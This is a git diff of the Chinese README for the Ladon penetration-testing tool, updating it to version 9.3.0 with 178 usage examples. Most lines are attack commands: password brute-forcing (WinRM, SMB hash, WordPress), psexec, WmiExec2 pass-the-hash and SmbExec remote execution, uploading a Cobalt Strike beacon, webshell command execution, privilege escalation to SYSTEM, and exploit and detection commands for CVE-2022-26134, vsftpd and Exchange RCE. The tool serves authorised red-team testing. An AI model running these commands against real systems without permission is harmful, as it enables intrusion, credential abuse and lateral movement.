@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: GUI版主要方便本地测试使用，完整功能使用CMD
 
 ### 版本
-Ladon9.2.4 20221018
-简明用法例子 175例
+Ladon9.3.0 20221128
+简明用法例子 178例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -150,7 +150,7 @@ Ladon EnumShare
 ##### 033 扫描LDAP服务器(探测域控)
 Ladon 192.168.1.8/24 LdapScan
 
-##### 034 扫描FTP服务器
+##### 034 扫描FTP服务器并识别版本
 Ladon 192.168.1.8/24 FtpScan
 
 ### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆
@@ -167,7 +167,7 @@ Ladon 192.168.1.8/24 WmiScan
 Ladon 192.168.1.8/24 LdapScan
 
 ##### 038 5985端口 Winrm密码爆破(Windowns)
-Ladon 192.168.1.8/24 WinrmScan.ini
+Ladon 192.168.1.8/24 WinrmScan
 
 ##### 039 445端口 SMB NTLM HASH爆破(Windows)
 Ladon 192.168.1.8/24 SmbHashScan
@@ -388,7 +388,7 @@ Ladon RdpLog
 
 ##### 099 445端口 加密PSEXEC远程执行命令（交互式）
 
-net user \\192.168.1.8 k8gege520 /user:k8gege
+net use \\192.168.1.8 k8gege520 /user:k8gege
 Ladon psexec 192.168.1.8
 psexec> whoami
 nt authority\system
@@ -405,11 +405,11 @@ Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami
 Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
 Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
 
-##### 103 JspShell远程执行命令（非交互式）
+##### 103 JspShell远程执行命令（非交互式）9.3.0移除
 Usage：Ladon JspShell type url pwd cmd
 Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
 
-##### 104 WebShell远程执行命令（非交互式）
+##### 104 WebShell远程执行命令（非交互式）9.3.0移除
 ```Bash
 Usage：Ladon WebShell ScriptType ShellType url pwd cmd
 Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
@@ -420,16 +420,16 @@ Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon whoami
 Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo
 ```
 
-##### 105 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传
+##### 105 135端口 WmiExec2远程执行命令支持HASH （非交互式）支持文件上传
 Usage:
 Ladon WmiExec2 host user pass cmd whoami
-Ladon WmiExec2 pth host cmd whoami
+Ladon WmiExec2 pth host cmd whoami		 先Mimikatz注入Hash，再pth执行命令
 Base64Cmd for Cobalt Strike
 Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
 Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
 Upload:
 Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe
-Ladon WmiExec2 pth host upload beacon.exe ceacon.exe
+Ladon WmiExec2 pth host upload beacon.exe ceacon.exe  先Mimikatz注入Hash，再pth执行命令
 
 ##### 106 445端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)
 Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami  
@@ -476,7 +476,7 @@ Ladon GetSystem cmd.exe explorer
 Ladon Runas user pass cmd
 
 ##### 116 MS16135提权至SYSTEM
-Ladon ms16135 whoami
+Ladon ms16135 whoami   >=9.2.1版本移除
 
 ##### 117 BadPotato服务用户提权至SYSTEM	
 Ladon BadPotato cmdline
@@ -628,7 +628,7 @@ Ladon ip.txt IPC
 ##### 156 IPB  批量IP转成ip B格式(192.168.)
 Ladon ip.txt IPB
 
-##### 157 批量检测Atlassian Confluence CVE-2022-26134
+##### 157 漏洞检测Atlassian Confluence CVE-2022-26134
 Ladon url.txt CVE-2022-26134
 
 ##### 158 Atlassian Confluence CVE-2022-26134 EXP
@@ -723,3 +723,13 @@ Ladon url.txt CiscoScan​
 ##### 175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测
 Ladon noping ip CVE-2011-2523
 Ladon noping ip.txt vsFTPdPoc  
+
+##### 176 WpScan WordPress密码审计、弱口令
+Ladon http://192.168.1.8 WpScan
+Ladon url.txt WpScan
+
+##### 177  探测Exchange版本不会触发WAF
+Ladon 192.168.1.8/24 ExchangeVer
+
+##### 178  Exchange高危RCE漏洞检测
+Ladon https://192.168.1.8 ExchangePoc
